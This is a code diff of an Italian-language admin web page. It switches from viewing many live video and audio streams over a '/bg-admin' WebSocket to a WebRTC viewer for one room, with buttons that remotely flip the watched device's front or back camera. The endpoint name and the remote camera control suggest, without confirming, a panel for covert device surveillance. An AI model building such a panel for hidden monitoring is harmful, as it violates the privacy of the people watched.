@@ -2,82 +2,44 @@
 <html lang="it">
 <head>
 <meta charset="UTF-8">
-<title>Admin Video+Audio</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Admin WebRTC</title>
 <style>
-body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
-.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:15px; }
-.cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; position:relative; padding-bottom:50px; }
-h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
-.status { position:absolute; bottom:35px; left:0; right:0; background:rgba(0,0,0,0.7); color:#0f0; text-align:center; padding:4px; font-size:12px; }
-.controls { position:absolute; bottom:0; left:0; width:100%; text-align:center; background:rgba(0,0,0,0.9); padding:5px; }
-.controls button { margin:0 5px; padding:6px 12px; background:#0f0; color:#000; border:none; cursor:pointer; border-radius:6px; font-weight:bold; }
-video { width:100%; display:block; }
+video { width: 300px; margin: 10px; border:2px solid #0f0; border-radius:6px; }
+button { margin:5px; padding:5px 10px; font-weight:bold; }
 </style>
 </head>
 <body>
-<h1>Admin Video+Audio</h1>
-<div id="grid" class="grid"></div>
+<h2>Admin WebRTC</h2>
+<div id="videos"></div>
+<button onclick="switchCam('user')">Front</button>
+<button onclick="switchCam('environment')">Back</button>
 
 <script>
-const grid=document.getElementById('grid');
-const ws=new WebSocket(`wss://${location.host}/bg-admin`);
-const rooms=new Map();
+const room = new URLSearchParams(location.search).get('room') || 'user1';
+let pc = new RTCPeerConnection();
+let ws = new WebSocket(`wss://${location.host}/signal`);
+let video = document.createElement('video');
+video.autoplay = true; video.playsInline = true; video.muted = false;
+document.getElementById('videos').appendChild(video);
 
-ws.onmessage=async e=>{
-  if(typeof e.data==='string'){
-    try{
-      const msg=JSON.parse(e.data);
-      if(msg.room){
-        if(!rooms.has(msg.room)){
-          const div=document.createElement('div'); div.className='cam';
-          const video=document.createElement('video'); video.id=`video-${msg.room}`;
-          video.autoplay=true; video.muted=false; video.playsInline=true;
-          const status=document.createElement('div'); status.className='status'; status.id=`status-${msg.room}`; status.textContent='Connesso';
-          const controls=document.createElement('div'); controls.className='controls';
-          controls.innerHTML=`
-            <button onclick="switchCam('${msg.room}','user')">Front</button>
-            <button onclick="switchCam('${msg.room}','environment')">Back</button>
-          `;
-          div.appendChild(video); div.appendChild(status); div.appendChild(controls); grid.appendChild(div);
+ws.onopen = () => ws.send(JSON.stringify({ type:'register', role:'admin', room }));
 
-          const mediaSource = new MediaSource();
-          video.src = URL.createObjectURL(mediaSource);
-          const streamObj = { mediaSource, sourceBuffer:null, queue:[], active:true, video };
-          mediaSource.addEventListener('sourceopen', ()=>{
-            try{
-              const sb = mediaSource.addSourceBuffer('video/webm; codecs="vp8,opus"');
-              sb.mode='sequence';
-              sb.addEventListener('updateend', ()=>{ processQueue(msg.room); });
-              streamObj.sourceBuffer=sb;
-            }catch(err){ console.error(err);}
-          });
-          rooms.set(msg.room, streamObj);
-        }
-        const statusEl=document.getElementById(`status-${msg.room}`);
-        if(statusEl) statusEl.textContent='Live - '+new Date(msg.timestamp).toLocaleTimeString();
-      }
-    }catch(err){ console.error(err);}
-  }else if(e.data instanceof Blob){
-    rooms.forEach(r=>{
-      if(r.sourceBuffer && r.active) r.queue.push(e.data);
-      processQueue(r.video.id.split('-')[1]);
-    });
+pc.ontrack = e => video.srcObject = e.streams[0];
+pc.onicecandidate = e => { if(e.candidate && ws.readyState===1) ws.send(JSON.stringify({type:'ice',candidate:e.candidate, room})); };
+
+ws.onmessage = async e => {
+  const data = JSON.parse(e.data);
+  if(data.type==='offer') {
+    await pc.setRemoteDescription({ type:'offer', sdp:data.sdp });
+    const answer = await pc.createAnswer();
+    await pc.setLocalDescription(answer);
+    ws.send(JSON.stringify({ type:'answer', sdp:answer.sdp, room }));
+  } else if(data.type==='ice') {
+    await pc.addIceCandidate(data.candidate);
   }
 };
 
-function processQueue(room){
-  const r=rooms.get(room);
-  if(!r||!r.sourceBuffer||r.sourceBuffer.updating||r.queue.length===0) return;
-  const blob=r.queue.shift();
-  blob.arrayBuffer().then(buf=>{
-    try{ r.sourceBuffer.appendBuffer(buf); }catch(err){ console.error(err);}
-  });
-}
-
-function switchCam(room,camera){
-  if(ws.readyState===WebSocket.OPEN) ws.send(JSON.stringify({type:'switchCamera',camera}));
-}
+function switchCam(cam){ if(ws.readyState===1) ws.send(JSON.stringify({type:'switchCamera', camera:cam, room})); }
 </script>
 </body>
 </html>
